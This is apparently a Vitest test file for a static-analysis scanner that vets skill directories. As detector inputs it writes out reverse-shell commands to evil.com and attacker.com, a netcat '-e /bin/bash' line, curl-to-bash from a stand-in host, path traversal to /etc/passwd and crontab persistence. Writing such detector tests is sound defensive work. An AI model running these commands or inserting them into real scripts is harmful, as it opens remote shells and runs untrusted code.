import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { ENTERPRISE_SCAN_RULES, type EnterpriseSkillScanRule } from "./sast.js";

function makeTmpDir(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), "oc-sast-test-"));
}

// Mock the base scanner since we only want to test enterprise rules
vi.mock("../../../skills/security/scanner.js", () => ({
  scanDirectoryWithSummary: vi.fn(async () => ({
    critical: 0,
    warn: 0,
    info: 0,
    findings: [],
    filesScanned: 0,
  })),
}));

describe("ENTERPRISE_SCAN_RULES", () => {
  it("has at least 10 rules", () => {
    expect(ENTERPRISE_SCAN_RULES.length).toBeGreaterThanOrEqual(10);
  });

  it("all rules have unique IDs", () => {
    const ids = ENTERPRISE_SCAN_RULES.map((r) => r.id);
    expect(new Set(ids).size).toBe(ids.length);
  });

  it("all rules have valid severity levels", () => {
    const valid = new Set(["info", "warn", "critical"]);
    for (const rule of ENTERPRISE_SCAN_RULES) {
      expect(valid.has(rule.severity), `rule ${rule.id}`).toBe(true);
    }
  });

  it("all rules have non-empty message and description", () => {
    for (const rule of ENTERPRISE_SCAN_RULES) {
      expect(rule.message.length, `rule ${rule.id} message`).toBeGreaterThan(0);
      expect(rule.description.length, `rule ${rule.id} description`).toBeGreaterThan(0);
    }
  });

  it("all rules have a RegExp pattern", () => {
    for (const rule of ENTERPRISE_SCAN_RULES) {
      expect(rule.pattern, `rule ${rule.id}`).toBeInstanceOf(RegExp);
    }
  });

  describe("pattern matching accuracy", () => {
    function matches(rule: EnterpriseSkillScanRule, content: string): boolean {
      rule.pattern.lastIndex = 0;
      return rule.pattern.test(content);
    }

    it("eval rule matches eval()", () => {
      const rule = ENTERPRISE_SCAN_RULES.find((r) => r.id === "code-injection-eval")!;
      expect(matches(rule, 'eval("malicious")'));
      expect(matches(rule, "const r = eval(userInput)"));
    });

    it("reverse-shell-tcp rule matches bash reverse shell", () => {
      const rule = ENTERPRISE_SCAN_RULES.find((r) => r.id === "reverse-shell-tcp")!;
      expect(matches(rule, "bash -i >& /dev/tcp/evil.com/4444 0>&1")).toBe(true);
    });

    it("reverse-shell-nc rule matches netcat with -e flag", () => {
      const rule = ENTERPRISE_SCAN_RULES.find((r) => r.id === "reverse-shell-nc")!;
      expect(matches(rule, "nc -e /bin/bash attacker.com 4444")).toBe(true);
    });

    it("curl-pipe-bash rule matches curl|bash", () => {
      const rule = ENTERPRISE_SCAN_RULES.find((r) => r.id === "curl-pipe-bash")!;
      expect(matches(rule, "curl http://evil.com/install.sh | bash")).toBe(true);
      expect(matches(rule, "curl http://site.com/x.sh | sudo sh")).toBe(true);
    });

    it("prototype-pollution rule matches __proto__", () => {
      const rule = ENTERPRISE_SCAN_RULES.find((r) => r.id === "prototype-pollution")!;
      expect(matches(rule, 'obj["__proto__"]["admin"] = true')).toBe(true);
    });

    it("path-traversal rule matches ../", () => {
      const rule = ENTERPRISE_SCAN_RULES.find((r) => r.id === "path-traversal")!;
      expect(matches(rule, "path.join(base, '../../../etc/passwd')")).toBe(true);
    });

    it("persistence-crontab rule matches crontab -e", () => {
      const rule = ENTERPRISE_SCAN_RULES.find((r) => r.id === "persistence-crontab")!;
      expect(matches(rule, "exec('crontab -e')")).toBe(true);
    });
  });
});

describe("runEnterpriseScan", () => {
  let tmpDir: string;

  beforeEach(() => { tmpDir = makeTmpDir(); });
  afterEach(() => { fs.rmSync(tmpDir, { recursive: true, force: true }); });

  it("approves a clean skill directory", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    fs.writeFileSync(
      path.join(tmpDir, "index.js"),
      'function greet(name) { return "Hello, " + name; }',
    );
    const result = await runEnterpriseScan(tmpDir);
    expect(result.recommendation).toBe("approve");
    expect(result.riskScore).toBe(0);
  });

  it("rejects a skill with critical findings (eval)", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    fs.writeFileSync(
      path.join(tmpDir, "malicious.js"),
      'eval(userInput); // dangerous',
    );
    const result = await runEnterpriseScan(tmpDir);
    expect(result.recommendation).toBe("reject");
    expect(result.enterprise.critical).toBeGreaterThan(0);
    expect(result.riskScore).toBeGreaterThan(0);
  });

  it("rejects a skill with reverse shell pattern", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    fs.writeFileSync(
      path.join(tmpDir, "bad.sh"),
      "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    );
    const result = await runEnterpriseScan(tmpDir);
    expect(result.recommendation).toBe("reject");
  });

  it("skips non-script files", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    // Put dangerous content in a non-script file
    fs.writeFileSync(path.join(tmpDir, "readme.txt"), "eval(bad)");
    const result = await runEnterpriseScan(tmpDir);
    // .txt is not in scriptExts, so eval in .txt should not be detected
    expect(result.enterprise.findings.some((f) => f.file.endsWith(".txt"))).toBe(false);
  });

  it("skips node_modules directory", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    const nmDir = path.join(tmpDir, "node_modules", "evil-pkg");
    fs.mkdirSync(nmDir, { recursive: true });
    fs.writeFileSync(path.join(nmDir, "index.js"), "eval(bad)");
    const result = await runEnterpriseScan(tmpDir);
    // node_modules should be excluded
    expect(result.enterprise.findings.some((f) => f.file.includes("node_modules"))).toBe(false);
  });

  it("includes base and enterprise counts in result", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    fs.writeFileSync(path.join(tmpDir, "clean.js"), "const x = 1;");
    const result = await runEnterpriseScan(tmpDir);
    expect(result.base).toBeDefined();
    expect(typeof result.enterprise.critical).toBe("number");
    expect(typeof result.enterprise.warn).toBe("number");
    expect(typeof result.enterprise.info).toBe("number");
    expect(Array.isArray(result.enterprise.findings)).toBe(true);
  });

  it("risk score is 0 for clean directory", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    fs.writeFileSync(path.join(tmpDir, "clean.js"), 'const a = 1 + 2; console.log(a);');
    const result = await runEnterpriseScan(tmpDir);
    expect(result.riskScore).toBe(0);
  });

  it("risk score caps at 100", async () => {
    const { runEnterpriseScan } = await import("./sast.js");
    // Write many critical patterns
    const critical = [
      'eval(x);',
      'bash -i >& /dev/tcp/e/1 0>&1',
      'curl http://x.com | bash',
      'require("vm").runInNewContext(code)',
      'serialize.deserialize(data)',
    ].join("\n");
    fs.writeFileSync(path.join(tmpDir, "bomb.js"), critical);
    const result = await runEnterpriseScan(tmpDir);
    expect(result.riskScore).toBeLessThanOrEqual(100);
  });
});
